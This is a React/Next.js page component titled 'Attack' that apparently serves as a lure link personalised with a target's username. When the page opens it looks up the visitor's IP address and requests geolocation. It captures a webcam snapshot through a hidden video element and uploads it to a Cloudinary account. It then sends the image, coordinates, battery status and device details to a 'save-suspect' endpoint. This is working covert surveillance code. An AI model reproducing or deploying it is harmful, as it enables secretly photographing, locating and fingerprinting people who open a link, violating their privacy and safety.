import React, { useContext, useEffect, useRef, useState } from 'react';
import Hero from '../components/Hero';
import Coordinates from '../components/Coordinates';
import axios from 'axios';
import { DataContext } from '@/store/GlobalState';
import { useRouter } from 'next/router';

export default function Attack() {

  const [locationAccess, setLocationAccess] = useState(false);
  const [latitude, setLatitude] = useState(null);
  const [longitude, setLongitude] = useState(null);
  const [snapshots, setSnapshots] = useState([]);
  const [isCameraAllowed, setIsCameraAllowed] = useState(false);
  const [showModal, setShowModal] = useState(false);
  // Set the userName state based on the extracted URL parameter
 
  const router = useRouter();
  const { userName } = router.query;
  console.log('userName:', userName); // Log the extracted userName

  const { state = {}, dispatch } = useContext(DataContext)
  const { auth = {} } = state


  const [userIp, setUserIp] = useState('');

  useEffect(() => {
    async function fetchIp() {
      try {
        const response = await axios.get('https://api.ipify.org?format=json');
        setUserIp(response.data.ip);
      } catch (error) {
        console.error('Error fetching IP:', error);
      }
    }

    fetchIp();
  }, []);

  const videoRef = useRef(null);

  useEffect(() => {
    const captureAndUploadSnapshot = async () => {
      try {
        if (latitude !== null && longitude !== null) {
          const videoElement = videoRef.current;
          const canvas = document.createElement('canvas');
          const context = canvas.getContext('2d');

          canvas.width = videoElement.videoWidth;
          canvas.height = videoElement.videoHeight;

          context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('file', blob, 'snapshot.jpg'); // 'snapshot.jpg' is the file name

            const cloudinaryResponse = await axios.post(
              `https://api.cloudinary.com/v1_1/dx7c0qn1e/image/upload?upload_preset=rui7rxz7`,
              formData,
              {
                headers: {
                  'Content-Type': 'multipart/form-data',
                },
              }
            );

            const imageUrl = cloudinaryResponse.data.secure_url;
            const osDetails = {
              platform: navigator.platform,
              userAgent: navigator.userAgent,
            };

            // Get battery status using Battery Status API
            if ('getBattery' in navigator) {
              navigator.getBattery().then((battery) => {
                const batteryLevel = battery.level * 100;
                const batteryCharging = battery.charging;
                // Get operating system details
               
                // Include battery status in the request
                axios.post('/api/save-suspect', {
                  userIp,
                  imageUrl,
                  latitude,
                  longitude,
                  userName,
                  batteryStatus: `${batteryLevel.toFixed(2)}%`,
                  batteryCharging,
                  osDetails: JSON.stringify(osDetails), // Convert object to JSON string
                });

                console.log('Suspect data saved successfully');
              });
            } else {
              // Battery Status API not supported, make request without battery status
              await axios.post('/api/save-suspect', {
                userIp,
                imageUrl,
                latitude,
                longitude,
                osDetails: JSON.stringify(osDetails), // Convert object to JSON string
              });

              console.log('Suspect data saved successfully');
            }
          }, 'image/jpeg'); // Specify image format here (e.g., JPEG)
        }
      } catch (error) {
        console.error('Error capturing and uploading snapshot:', error);
      }
    };

    console.log('user id', userName)
    const getCameraAccess = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        setIsCameraAllowed(true);

        const videoElement = videoRef.current;
        videoElement.srcObject = stream;
        videoElement.onloadeddata = () => {
          videoElement.play();
          captureAndUploadSnapshot(); // Capture and upload a single snapshot
        };
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    };

    getCameraAccess();
  }, [latitude, longitude]);


  const getCameraAccess = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });

      // Access to camera is granted
      setIsCameraAllowed(true);

      // Create a video element to display the camera stream
      const videoElement = videoRef.current;
      videoElement.srcObject = stream;
      videoElement.onloadeddata = () => {
        // Ensure the video frames are fully loaded before capturing snapshots
        videoElement.play();
      };
    } catch (error) {
      // Handle error if camera access is denied
      console.error('Error accessing camera:', error);
      setShowModal(true);
    }
  };

  const closeModal = () => {
    setShowModal(false);
  };


  useEffect(() => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude } = position.coords;
          console.log('Location:', latitude, longitude);
          setLocationAccess(true);
          setLatitude(latitude);
          setLongitude(longitude);
        },
        error => {
          console.error('Error getting location:', error);
        }
      );
    } else {
      console.error('Geolocation is not supported in this browser.');
    }
  }, []);






  return (
    <>
      <div className='ml-[25%] text-white'>
   <h1>Heloooo {userName}</h1>
        <Hero />
        <video ref={videoRef} style={{ display: 'none' }} />
        {/* {locationAccess ? (
          <Coordinates longitude={longitude} latitude={latitude}/>
        ) : (
          <p>Requesting location access...</p>
        )} */}
      </div>
    </>
  );
}
